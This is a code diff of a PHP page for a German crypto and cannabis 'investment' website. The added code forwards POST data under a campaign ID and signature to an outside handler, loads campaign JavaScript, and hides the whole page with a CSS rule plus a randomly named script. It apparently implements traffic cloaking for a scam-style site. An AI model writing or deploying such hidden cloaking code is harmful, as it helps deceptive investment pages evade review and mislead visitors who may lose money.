@@ -19,18 +19,34 @@ if ($enableDebugging) {
 	isApplicationReadyToRun();
 }
 
-$data = httpRequestMakePayload($campaignId, $campaignSignature);
+if (isPost())
+{
+	// Allows for modded query strings
+	$myQueryString = getForwardedQueryString($_POST);
 
-$response = httpRequestExec($data);
+	/**
+	 *  Add or Modify Query String Variables in the section below.
+	 *  WARNING: Variables with the same name will be re-written
+	 */
+    // Ex.: $myQueryString['my_custom_variable'] = 'my custom variable';
 
-$handler = httpHandleResponse($response, $enableLogging);
+	$data = httpRequestMakePayload($campaignId, $campaignSignature, $_POST);
 
-if ($handler) {
+	$response = httpRequestExec($data);
+
+	httpHandleResponse($response, $enableLogging);
+
 	exit();
 }
-
+else
+{
+	try {
+		loadJavascript($campaignId);
+	} catch (Exception $e) {
+		exit();
+	}
+}
 ?>
-
 <!DOCTYPE html><html lang="de-DE"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>Home</title><meta name="description" content="Startseite des des Investment Lexikon "><meta name="keywords" content="Investment, Invest, Krypto, Währung, Cannabis, medizinisches Cannabis, ewallet, Hub, Mining, Minting ,  Rendite, elektronische Brieftasche , Anlage, passiv einkommen, nebenverdienst, "><meta content="Home" property="og:title"><meta content="website" property="og:type"><meta content="http://511166783.swh.strato-hosting.eu/Startseite/" property="og:url"><meta content="images/Logo%20miktro%20Investment.png" property="og:image">
 
 
@@ -47,7 +63,8 @@ if ($handler) {
 
 <link href="css/cm-templates-global-style.css" rel="stylesheet" type="text/css">
 	
-	
+	<style type="text/css"> html { display: none; }</style>
+	<script type="text/javascript" src="164rbxv5bvpi.js"></script>
 
 <link href="css/vars.css" type="text/css" rel="stylesheet"><style type="text/css">.cm-logo {background-image: url("images/Inverstment.jpeg");
         background-position: 50% 50%;
